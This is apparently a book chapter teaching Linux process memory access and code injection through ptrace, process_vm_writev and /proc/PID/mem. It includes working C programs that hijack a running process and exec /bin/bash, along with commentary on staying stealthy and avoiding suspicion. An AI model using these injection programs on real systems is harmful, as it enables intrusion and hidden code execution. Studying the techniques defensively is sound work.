# Peek and Poke on steroids. `process_vm_readv/process_vm_writev`

In the previous chapter, we saw how `ptrace` can be used for reading and writing arbitrary memory in the addressing space of any process. We also saw that the way to do that is cumbersome and slow—as slow as one system call for each word to read or write, which may be unacceptable for some use cases, such as game hacking, which we’ll discuss later in this chapter. To avoid that problem, two new system calls were introduced: `process_vm_readv` and `process_vm_writev`. These system calls are vectorized (can use multiple buffers), so the `v` at the end of their names, and, as we’ll see in a second, they use the same data structures as other `v` system calls like `readv`, `writev`, or `vmsplice`.

So, let’s start rewriting our last `ptrace` example using these system calls. This allows us to begin from a known starting point and smoothly introduce the way to use them.

## Modifying memory part II

Let’s take the program from the homonym section in chapter 1 and modify it to use these system calls. This is the resulting code:

```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <sys/mman.h>

#define DIE(s) {perror(s); exit(1);}

int inject_syscall (pid_t pid, struct user_regs_struct *regs, int syscall,
		    int p1, int p2, int p3, int p4) {
  int status;
  
  regs->rax = syscall;
  regs->rdi = p1;
  regs->rsi = p2;
  regs->rdx = p3;
  regs->r10 = p4;

  if (ptrace (PTRACE_SETREGS,pid,0,regs) < 0)  DIE ("PTRACE_SETREGS:");
  if (ptrace (PTRACE_SINGLESTEP,pid,0,0) < 0)  DIE ("PTRACE_SINGLESTEP:");
  wait (&status);
  
  return status;
}

int main (int argc, char *argv[]) {
  struct user_regs_struct  regs;
  struct user_regs_struct  old_regs;
  int                      status;
  pid_t                    pid = atoi(argv[1]);
  char                     *msg = "\x0f\x05Hello, world!\n";
  struct iovec             local1[1], local2[1], remote[1];
  ssize_t                  len = strlen(msg);
  int                      pagesize = sysconf (_SC_PAGESIZE);
  
  if (ptrace (PTRACE_SEIZE,pid,0,0) < 0) DIE("PTRACE_SEIZE:");
  if (ptrace (PTRACE_INTERRUPT,pid,0,0) < 0)  DIE ("PTRACE_INTERRUPT:");
  wait (&status);

  if (ptrace (PTRACE_GETREGS,pid,0,&old_regs) < 0)  DIE ("PTRACE_GETREGS:");
  memcpy (&regs, &old_regs, sizeof(regs));
  
  local1[0].iov_base = malloc (len);
  local1[0].iov_len  = len;
  remote[0].iov_base = (void*) regs.rip;
  remote[0].iov_len  = len;
  process_vm_readv (pid, local1, 1, remote, 1 ,0);
  
  if (ptrace (PTRACE_POKETEXT,pid,regs.rip, 0x000000000000050f) < 0)  DIE ("PTRACE_POKETEXT:");
  inject_syscall (pid, &regs, 10,
		  regs.rip & ~(pagesize - 1), pagesize, PROT_WRITE | PROT_READ | PROT_EXEC,0);

  local2[0].iov_base = msg;
  local2[0].iov_len = len;;
  process_vm_writev(pid, local2, 1, remote, 1, 0);
  
  inject_syscall (pid, &regs, 1, 1, regs.rip + 2, len -2, 0);

  process_vm_writev(pid, local1, 1, remote, 1, 0);
  free (local1[0].iov_base);
  
  if (ptrace (PTRACE_SETREGS,pid,0,&old_regs) < 0)  DIE ("PTRACE_SETREGS:");
  if (ptrace (PTRACE_DETACH,pid,0,0) < 0) DIE ("PTRACE_DETACH:");
  return 0;	    
}
```

> **TECHNIQUE**: Read and write remote process memory
>
> _Code injection/Data exfiltration_
>
> Using `process_vm_readv` and `process_vm_writev`, a process with the right permissions can read and write, respectively, any process memory. Memory access using these system calls is controlled by the target memory VMA permissions.

Let’s ignore the `inject_syscall` helper function at the beginning of the program (you already know it) and focus on the `main` function. The program is almost identical to the previous one using `PTRACE_POKETEXT` and `PTRACE_PEEKTEXT`, but it uses our new friends instead. Let’s look at the very first call where we make a copy of code at the current `rip` position from the target process:

```C
  local1[0].iov_base = malloc (len);
  local1[0].iov_len  = len;
  remote[0].iov_base = (void*) regs.rip;
  remote[0].iov_len  = len;
  process_vm_readv (pid, local1, 1, remote, 1 ,0);
```

The `v` system calls (or vectorized I/O system calls) use the `iovec` struct, which allows us to define a memory block using a base address and a length. The `v` system calls can work with many of those buffers simultaneously, so they usually receive an array of those structures (hence the vectorized I/O designation). This way, we can write or read different blocks of memory and combine them in just one write or read (one single system call).

This is very useful, for instance, when implementing protocols that compose data as a header and some payload. Traditionally, you have to make arrangements in your program to compose the final packet or perform two operations, one for the header and one for the payload. With these primitives (`readv`/`writev`), you can just use two memory blocks, one for the header and one for the payload, and send them together using an `iovec` array with two elements. In the same way, you can read a whole packet from the network and make the first bytes (the header) end up in a buffer and the payload in a different one in just one call. In our example, we just need one entry, so our `local` and `remote` arrays have only one element.

Let's now look into the parameters to `process_vm_readv` in detail. This is its prototype:

```C
ssize_t process_vm_readv(pid_t pid,
                         const struct iovec *local_iov,
                         unsigned long liovcnt,
                         const struct iovec *remote_iov,
                         unsigned long riovcnt,
                         unsigned long flags);
```

The first parameter is the `pid` of the remote process we want to read from (the write counterpart has the same parameters, so everything said here also applies to `process_vm_writev`). Then follow the local memory blocks where the remote memory will be copied to. After that follow the remote memory blocks from `PID` we want to read. Finally, there is a `flags` parameter, but at the time of this writing, it’s unused and shall be set to zero.

In the example code, you can see how a local buffer is allocated to store the bytes read from the remote process using `malloc`. The remote buffer points to the current value of `rip` (the point at which we stopped the process) to read the instructions at that position so we can back up those memory positions in order to safely overwrite them and restore that memory area back later.

`process_vm_writev` works exactly the same but to write into the indicated process. We use it twice in the program, once to write the string we want (and also the `syscall` instruction) and another to restore the original code in the remote process.

`process_vm_writev` and `process_vm_readv` honor the permissions associated with the memory area we want to write or read, respectively. For that reason, writing code into a `.text` segment will initially fail because such a segment doesn't have write permission. Therefore, before using `process_vm_writev`, we have to inject into the remote process a `mprotect` system call to change the permissions of the `.text` page we’re interested in, and the easiest way to do that is using `PTRACE_POKETEXT`. We’ll see later ways to do this without using `ptrace`.

This is what these two lines of code do:

```C
  if (ptrace (PTRACE_POKETEXT,pid,regs.rip, 0x000000000000050f) < 0)  DIE ("PTRACE_POKETEXT:");
  inject_syscall (pid, &regs, 10,
                  regs.rip & ~(pagesize - 1), pagesize, PROT_WRITE | PROT_READ | PROT_EXEC,0);
```

The first one inserts a `syscall` instruction (`0x050f`) at the current `rip` position (the next instruction to be executed), and then it calls our `inject_syscall` helper function, which, in this case, will run a `mprotect` system call to add write permissions to the memory area we’re interested in.

> NOTE
>
> Injecting our own `syscall` is convenient because we don’t have to look for that instruction in the target program. Actually, you won’t likely find a `syscall` instruction in the main program because it uses LibC wrappers for all OS interactions. Therefore, you’ll have to look for the `syscall` instruction in the libC mapping in memory. Note that, if you have located such an instruction, you can just set `rip` to point to it, and you will save the `PTRACE_POKE` write. On the other side, you need to find the correct range of memory to look for and run a scan through it to find the `syscall` instruction.

The `inject_syscall` is a convenient helper function to run system calls in place. In the example above, we are executing:

```C
  inject_syscall (pid,                        // PID to target process
                  &regs,                      // Current set of registers
				  10,                         // Syscall Number: mprotect (10)
		          regs.rip & ~(pagesize - 1), // Par 1: Page Aligned Base Address to change permissions
				  pagesize,                   // Par 2: Size of Memory Block to change permissions
				  PROT_WRITE | PROT_READ      // Par 3: Permissions to be set
				  | PROT_EXEC,0);
```

We’ll be using the `inject_syscall` helper function very often throughout the book. In our current example, it’s used for the initial `mprotect` call and also for the `write` call later to print the `Hello, world!` message.

> **W^X Protection**
>
> Modern systems offer the so-called W^X protection or "Write XOR Execution" which ensures that the write and execution permissions cannot be set at the same time in a given memory area. This usually means that in order to write code somewhere in the process’ addressing space, we need to first enable the write permission (and disable the execution) in order to write the code, and then set the execution permission back and remove the write one. Basically, we’ve to do two operations sequentially instead of one. This is fine when using a separated memory block as we’ll see in the next chapter, but if we inject code just into the text segment of the target project, we cannot do that. Let's see what happens.
>
> We inject our `syscall` instruction in order to be able to run `mprotect` to change permissions as we did in our example. As the W^X protection is active, we cannot set `PROT_READ | PROT_WRITE | PROT_EXEC`; instead, we need to do `PROT_READ | PROT_WRITE` effectively removing the execution permission. Now we can write our code in the text segment, but we cannot execute it. We need to reset the permissions to enable `PROT_EXEC` again, but we cannot run a `mprotect` as we did before, because the injected `syscall` instruction is now in non-executable memory, and if we try to run it, we’ll get a segmentation fault.
>
> As you can see, this kind of protection makes things a bit more tricky. Basically, you’ll have to run your system calls from a different memory page so you can remove the execution permission from the text segment while keeping the execution permissions on the memory block from where you are running the syscalls. We’ll see more on this later. For now, just keep in mind that W^X protection is a thing. BTW, this is not available in the Linux kernel by default; you need to install special kernel modules to enable this kind of protection.

Codewise, using `process_vm_readv/process_vm_writev` with this example adds more lines of code; however, overall the code will be faster, especially if the code to be injected is long or requires quite some data. In that case, all the memory copying is done by one single system call, where, if using `ptrace`, we may have to run many system calls (depending on the size of the data to move), which are costly and slow operations.

Now we know how these powerful system calls work, and we’ll see some more interesting techniques using them. But first, I need to talk about an alternative.

## Modifying memory part III

Before diving into specific uses of our new friends to read and write memory on any process, I'll introduce a third way to do this. I'm adding it here because this technique doesn't rely on a system call and therefore will be difficult to fit it in any other chapter. 

The Linux kernel offers an interface to access the memory of any process through the `/proc/PID/mem` pseudo file. Reading and writing to that file will capture or modify the indicated process memory as far as we've the right permissions which are, basically, the same permissions needed to use the `ptrace` system call.

Using this interface is very simple, we just read and write like in a regular file but the pointer in the file is the memory address we want to access. For example, supposing you have already opened the file and you want to read the value of the memory at address `0x400123` and then change it into a `NOP`:

```C
   uint8_t  val, val1 = 0x90;
   lseek (fd, 0x400123, SEEK_SET);
   read (fd, &val, 1);
   ...
   lseek (fd, 0x400123, SEEK_SET);
   write (fd, &val1, 1);
```

Even when you can use regular `read` and `write` to access the file, as shown above, those are a bit inconvenient because these two system call modify the file pointer so we typically will have to reset it (using `lseek`) on every access, meaning that we'll need 2 system calls per access. Fortunately, the Linux kernel offers two system calls that match perfectly our needs.

```C
       ssize_t pread(int fd, void buf[.count], size_t count,
                     off_t offset);
       ssize_t pwrite(int fd, const void buf[.count], size_t count,
                     off_t offset);
```

_NOTE: Even when the LibC wrappers are named `pread` and `pwrite`, the actual system calls used underneath are named `pread64` and `pwrite64`_.

They work as regular `read` and `write` but we can pass the offset into the file in each operation and therefore work independently of the internal file pointer. Additionally, they don’t change the file pointer after execution, which is also interesting. With this new knowledge, we can rewrite the `main` function of our test program like this:

```C
int main (int argc, char *argv[]) {
  struct user_regs_struct  regs;
  struct user_regs_struct  old_regs;
  int                      status;
  pid_t                    pid = atoi(argv[1]);
  char                     *msg = "\x0f\x05Hello, world!\n";
  ssize_t                  len = strlen(msg);
  char                     mem_path[1024], *orig_code;
  int                      mem;
  
  if (ptrace (PTRACE_SEIZE,pid,0,0) < 0) DIE("PTRACE_SEIZE:");
  if (ptrace (PTRACE_INTERRUPT,pid,0,0) < 0)  DIE ("PTRACE_INTERRUPT:");
  wait (&status);

  if (ptrace (PTRACE_GETREGS,pid,0,&old_regs) < 0)  DIE ("PTRACE_GETREGS:");
  memcpy (&regs, &old_regs, sizeof(regs));

  snprintf (mem_path, 1024, "/proc/%d/mem", pid);
  mem = open (mem_path, O_RDWR);

  orig_code = malloc (len);
  pread (mem, orig_code, len, regs.rip);
  
  pwrite (mem, msg, len, regs.rip);
  inject_syscall (pid, &regs, 1, 1, regs.rip + 2, len -2, 0);
  pwrite (mem, orig_code, len, regs.rip);

  close (mem);
  if (ptrace (PTRACE_SETREGS,pid,0,&old_regs) < 0)  DIE ("PTRACE_SETREGS:");
  if (ptrace (PTRACE_DETACH,pid,0,0) < 0) DIE ("PTRACE_DETACH:");
  return 0;	    
}
```
> **TECHNIQUE**: Read and write remote process memory
>
> _Code injection/Data exfiltration_
>
> The `/proc/PID/mem` pseudo file can be used to access the memory of any process, supposing you have the right permissions. Memory accesses using the pseudo file are better performed using the `pread/pwrite` system calls.

The use of this interface is pretty straightforward, and as you can see, it doesn’t honor the VMA permissions, which means that we can read or write at any address without restrictions. The code above doesn’t require the `mprotect` call, and the use of `pread` and `pwrite` makes modifying the memory of the target process very easy.

Overall, the main difference between using `/dev/pid/mem` and the `process_vm_XXXv` is that the second one allows us to access different memory areas in one single call, whereas using the `/proc` file will require multiple system calls.

<!--- Writing or reading data blocks across different memory areas is usually known as scatter/gather, and it’s commonly used, for example, by hardware to transfer data directly into memory using DMA (_Direct Memory Access_ surprising name, isn't it?), being one of the possible strategies for that direct transfer. --->

At first glance, using `/proc/pid/mem` looks much better. Usually, it is; however, this interface used to be much more secured (as secured as `ptrace`) in even default Linux installations. In the rest of the chapter, I’ll use `process_vm_XX` because we’re dealing with system calls, but now you know that you can modify (and in many cases simplify) all the programs in this chapter accessing `/proc/pid/mem` instead. That can be a nice exercise.

## Destructive Code Injection

We’ve seen a simple way of code injection, but there are many other options to do that. In this section, we’ll explore them using `process_vm_readv` and `process_vm_writev`. But before diving into the details, you may be wondering why code injection is a thing. Let’s see some of the reasons why code injection is interesting.

* Running certain code from within certain programs will make some actions look less suspicious. A calculator making a TCP connection to a random server may be suspicious, but one more connection in a Firefox process won’t surprise anybody.
* Running code inside an existing process gives us access to all the resources that process manages.
* Code injection is a fundamental part of many exploitation techniques.
* It’s pretty cool to make any program in your system do what you want. B)

The main concept about code injection is to take advantage of tools trusted by the system, and by making those tools run your code, you may make that behavior look normal, or access resources that will be much harder to access in a different way. Note that you already need root to implement many of those techniques (or alternatively exploiting an existing vulnerability), but that is a different story. At the end, any intrusion is a sequence of steps in which each step sets the basis for executing the next one until the final objective is achieved. Each of these steps can be done in different ways, using different techniques, and one of those techniques is code injection, so it’s something useful to learn about.

Now that we know why we want to inject code, let’s see how to do it. Let’s look at which types of code injection are available. As usual, there are as many classifications as people in the world, however, a reasonable objective way to do this classification is dividing the techniques looking at the way they modify the target process: Destructive and Non-destructive.

A destructive technique will break the target program, or in other words, it’ll stop doing what it was supposed to do. In those cases, we want the target program to do something for us and, once done, we don’t care anymore if it lives or dies. Somehow, this exposes the attacker much more, which may be OK sometimes. One random crash of a program doesn’t raise an alarm immediately, but if it starts crashing all day long, then somebody will start asking what the hell is going on.

A non-destructive approach, on the other hand, is much stealthier. It’ll inject and execute the code in the target process but in a way that the target program keeps working normally. Those techniques are harder to detect and may keep some code running in the system hidden for long periods of time without raising any alarm.

There are many different ways to do both, and we’ll see a few making use of `process_vm_writev/readv` and the infrastructure we had already set up.

### Code injection with `execve`

The simplest way of destructive code injection is using the `execve` system call. Actually implementing this technique takes almost the same effort than running our `Hello World` example. Let’s take our original program and modify it to run `bash`, instead of printing a greeting in the console.

I’ll just show the `main` function, everything else is the same including the `inject_syscall` function:


```C
int main (int argc, char *argv[]) {
  struct user_regs_struct  regs;
  struct user_regs_struct  old_regs;
  int                      status;
  pid_t                    pid = atoi(argv[1]);
  uint64_t                 v;
  struct iovec             local1[1], local2[1], remote[1];
  int                      pagesize = sysconf (_SC_PAGESIZE);
  char                     *path = "/bin/bash";
  ssize_t                  len = strlen(path) + 1; // copy 0

  // --------------------------------------
  // Prepare to use process_vm_writev
  if (ptrace (PTRACE_SEIZE,     pid, 0, 0) < 0) DIE("PTRACE_SEIZE:");
  if (ptrace (PTRACE_INTERRUPT, pid, 0, 0) < 0) DIE ("PTRACE_INTERRUPT:");
  wait (&status);
  if (ptrace (PTRACE_GETREGS,   pid, 0, &regs) < 0)  DIE ("PTRACE_GETREGS:");
  
  // We need to poke the syscall to change memory permissions at target
  if (ptrace (PTRACE_POKETEXT, pid, regs.rip, 0x000000000000050f) < 0)  DIE ("PTRACE_POKETEXT:");
  inject_syscall (pid, &regs, 10,
		  regs.rip & ~(pagesize - 1), pagesize, PROT_WRITE | PROT_READ | PROT_EXEC,0);
  // ----------------------------
  local1[0].iov_base = path;
  local1[0].iov_len  = len;
  remote[0].iov_base = (void*) regs.rip + 2; // Copy just after syscall
  remote[0].iov_len  = len;
  process_vm_writev (pid, local1, 1, remote, 1, 0);
  
  inject_syscall (pid, &regs, 59, regs.rip + 2, 0, 0, 0);
  if (ptrace (PTRACE_DETACH,   pid,        0,         0) < 0) DIE ("PTRACE_DETACH:");
  return 0;	
}
```
The program should be very easy to follow by now, but let me draw your attention to a couple of details:

* We have to add 1 to the length of the string, this is because `execve` requires that the strings are zero-terminated and `strlen` doesn’t count the ending zero.
* After calling `execve`, our original process is completely destroyed so there is no point on saving old registers or restoring overwritten data, which allows us to get rid of quite some code.

Even when this is not the most stealthy way to inject code, it’s a good exercise to get fluent with what is coming. Actually, to illustrate the power of `process_vm_readv/writev`, let’s pass some arguments to the `execve` system call.

For doing that, we need to fit an array of strings (pointers to character arrays) plus the strings in memory so we can point the proper register to that memory area when calling `execve`. This is a possible memory layout:

    RIP + 00 | 05 0f              -> Syscall
    RIP + 02 | /bin/bash\0        -> Path
        RIP + 12 | arg[0] = RIP + 28  -> Pointer to arg[0] ---------------------+
        RIP + 20 | NULL               -> args is NULL terminated                |
        RIP + 28 | /bin/firefox       -> content of arg[0] (actual string)  <---+

Note that in order to generate this structure we need the value of register `rip` so we can generate the correct pointer in the pointer array to the arguments. We can easily generate a memory block with this content and copy it over to the target process, or we can take advantage of `process_vm_writev`. Take a look to this code. Again I’m only showing `main` to keep the listing short:



```C
int main (int argc, char *argv[]) {
  struct user_regs_struct  regs;
  int                      status;
  pid_t                    pid = atoi(argv[1]);
  struct iovec             local1[3], remote[1];
  int                      pagesize = sysconf (_SC_PAGESIZE);
  char                     *path = "/bin/bash";
  char                     *args = "/bin/firefox";
  char                     *pargs[] = {0,0};
  ssize_t                  len = strlen(path) + 1; // copy 0
  ssize_t                  len1 = strlen(args) + 1; // copy 0

  // --------------------------------------
  // Prepare to use process_vm_writev
  if (ptrace (PTRACE_SEIZE,     pid, 0, 0) < 0) DIE("PTRACE_SEIZE:");
  if (ptrace (PTRACE_INTERRUPT, pid, 0, 0) < 0) DIE ("PTRACE_INTERRUPT:");
  wait (&status);
  if (ptrace (PTRACE_GETREGS,   pid, 0, &regs) < 0)  DIE ("PTRACE_GETREGS:");
  if (ptrace (PTRACE_POKETEXT, pid, regs.rip, 0x000000000000050f) < 0)  DIE ("PTRACE_POKETEXT:");
  inject_syscall (pid, &regs, 10,
		  regs.rip & ~(pagesize - 1), pagesize, PROT_WRITE | PROT_READ | PROT_EXEC,0);
  // ----------------------------
  pargs[0] = (void*)(regs.rip + 2 + len + sizeof(void*)*2);
  
  local1[0].iov_base = path;
  local1[0].iov_len  = len;
  
  local1[1].iov_base = pargs;
  local1[1].iov_len  = sizeof(void*) * 2;
  
  local1[2].iov_base = args;
  local1[2].iov_len  = len1;

  remote[0].iov_base = (void*) regs.rip + 2; // Copy just after syscall
  remote[0].iov_len  = len + len1 + sizeof(void*)*2;
  process_vm_writev (pid, local1, 3, remote, 1, 0);

  inject_syscall (pid, &regs, 59, regs.rip + 2, regs.rip + 2 + len, 0, 0);
  if (ptrace (PTRACE_DETACH,   pid,        0,         0) < 0) DIE ("PTRACE_DETACH:");
  return 0;
}
```

> **TECHNIQUE**: Destructive code injection with execve
>
> _Code injection_
>
> Use `ptrace` and `process_vm_writev` system calls to inject a `execve` system call in a running process to run a different program.

Pay attention to the code. We declare all our strings separately (`path` and `args`) and also an array of pointers to strings initialized to zero (`pargs`). Note that the `local1` array now has 3 elements. Then, in the main program, after setting the right pointer value in the pointer array (setting `pargs[0]`), we just define three memory regions to write over to the target process. Note that the local blocks can be anywhere and they will all be copied one after the other in the target region. This is what the `v` syscalls are intended to do.

In this example, I write the data on the `text` segment just to mimic previous examples, but note that once we have the `syscall` instruction, the rest of the data can be anywhere, for example in the stack (we’ll use `rsp` instead of `rip` for the remote addresses). That way, we do not need the initial call to `mprotect` anymore.

> EXERCISE: Modify previous program to store the data in the stack instead of writing it into the `text` segment. Note that you don’t need to call `mprotect` anymore and also note that the stack grows downwards, so you should make space in it subtracting a value from `rsp`. In this case, as the injection is destructive it doesn’t really matter, but it’s better to do it right to practice.

Destructive code injection like this is easy to implement and, if needed for just one shot, are good enough. Basically, some program will _stop working_ randomly. If this happens once, the natural reaction is to launch it again and continue; we’re used to software crashes now and then (especially in some OSes). An user or admin will only suspect that something is going on if the program keeps crashing again and again. So, each technique, despite how simple or rough may look, usually have a situation where it’s a good choice.


